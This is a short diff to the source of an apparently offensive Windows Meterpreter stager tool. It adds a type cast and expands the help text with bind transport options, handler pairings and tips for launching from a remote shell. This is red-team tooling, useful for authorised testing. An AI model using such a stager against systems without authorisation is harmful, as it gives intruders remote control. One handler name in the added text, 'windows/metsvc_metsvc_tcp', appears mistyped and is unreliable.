@@ -80,7 +80,7 @@ int PatchString(unsigned char* buffer, const wchar_t* replacement, const int ind
 	int counter = 0;
 	for(int i = index; i < (index + NoOfBytes); i++)
 	{
-		buffer[i] = replacement[counter];
+		buffer[i] = (u_char)replacement[counter];
 		counter++;
 	}
 	return 0;
@@ -140,7 +140,7 @@ void usage()
 		"\nMandatory switches:\n"
 		"\t-h\tLHOST\tIP or a hostname.\n"
 		"\t-p\tLPORT\tPort number.\"\n"
-		"\t-t\tTRANSPORT\t\"reverse_tcp\", \"reverse_metsvc\", \"reverse_http\" or \"reverse_https\" .\n"
+		"\t-t\tTRANSPORT\t\"reverse_tcp\", \"reverse_metsvc\", \"reverse_http\", \"reverse_https\" ,\"bind_tcp\" or \"bind_metsvc\""
 
 		"\nHTTP(S) Specific parameters:\n"
 		"\t-ua\tU_AGENT\t User-Agent, enclose in `\"\"` if contains spaces.\n"
@@ -154,10 +154,14 @@ void usage()
 
 		"\n - If you're on a shell [not a console], you have to start the program using:\n"
 		"  \"start /b ultimet.exe ...\" or you'll lose your shell.\n"
-		"\n - For the reverse_metsvc option, stage has to be available upfront, either through the bundled resource\n"
-		"    or loaded usng the \"-f\" option; note that the most reliable handler for reverse_metsvc is:\n"
+		"\n - For the reverse_metsvc & bind_metsvc options, stage has to be available\n"
+		"   upfront, either through the bundled resource or loaded usng the \"-f\" option\n"
+		"\n[+] note that the most reliable handler for reverse_metsvc is:\n\n"
 		"  \"windows/metsvc_reverse_tcp\" ... using reverse_metsvc to connect to a \"reverse_tcp\" *might* work,\n"
-		"    but not always, so, use reverse_metsvc with windows/metsvc_reverse_tcp... ok?\n"
+		"  but not always, so, use reverse_metsvc with windows/metsvc_reverse_tcp... ok?\n"
+		"\nand also for bind_metsvc:\n"
+		"  \"windows/metsvc_bind_tcp\" ... using bind_metsvc to connect to a \"bind_tcp\" *might* work,\n"
+		"  but not always, so, use bind_metsvc with windows/metsvc_metsvc_tcp...\n"
 
 		);
 }
